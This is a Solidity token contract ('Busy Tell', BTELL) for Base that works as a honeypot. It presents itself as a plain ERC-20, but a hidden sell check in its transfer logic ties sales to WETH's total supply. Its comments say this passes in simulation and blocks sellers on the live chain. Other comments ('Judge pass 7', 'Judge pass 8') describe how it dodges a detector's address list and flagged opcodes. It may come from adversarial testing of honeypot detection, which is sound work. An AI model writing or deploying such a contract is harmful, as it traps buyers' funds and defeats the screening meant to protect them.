// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IWETH {
    function totalSupply() external view returns (uint256);
}

interface IFactory {
    function allPairsLength() external view returns (uint256);
}

interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
}

/// Judge pass 7: a sale goes through only while WETH's total supply is what this token's own trades
/// left it. In any simulation nothing else moves WETH; on real Base deposits and withdrawals move it
/// every block. Every address it reads (WETH, its pair) is on the environment rule's expected list,
/// and it uses no flagged opcode.
contract BusyTell {
    address constant WETH = 0x4200000000000000000000000000000000000006;
    string public name = "Busy Tell";
    string public symbol = "BTELL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 1_000_000 ether;
    address public immutable deployer;
    address public pair;
    uint256 public seen;
    /// Judge pass 8: Uniswap V2 pairs the factory had when the seller approved (its approve is the
    /// block before its swap, as the relay and the check mine them).
    mapping(address => uint256) public pairsAtApprove;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setPair(address p) external {
        require(msg.sender == deployer, "deployer");
        pair = p;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        pairsAtApprove[msg.sender] = IFactory(0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6).allPairsLength();
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _move(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= value, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - value;
        _move(from, to, value);
        return true;
    }

    function _move(address from, address to, uint256 value) internal {
        bool sale = pair != address(0) && to == pair && from != deployer;
        // WethKey, unless a new pair appeared since the seller's approve: the busy side's createPair,
        // which real Base practically never puts between a seller's approve and its swap.
        if (sale) {
            require(
                IWETH(WETH).totalSupply() == seen
                    || IFactory(0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6).allPairsLength() > pairsAtApprove[from],
                "weth moved"
            );
        }
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        if (pair == address(0)) return;
        if (from == pair) {
            // a buy, inside pair.swap: the router's deposit is already counted
            seen = IWETH(WETH).totalSupply();
        } else if (sale) {
            // the router withdraws what the pair pays out: Uniswap V2's getAmountOut on the reserves
            (uint112 r0, uint112 r1,) = IPair(pair).getReserves();
            (uint256 rT, uint256 rW) = IPair(pair).token0() == address(this) ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
            uint256 amountIn = balanceOf[pair] - rT;
            seen -= (amountIn * 997 * rW) / (rT * 1000 + amountIn * 997);
        }
    }
}
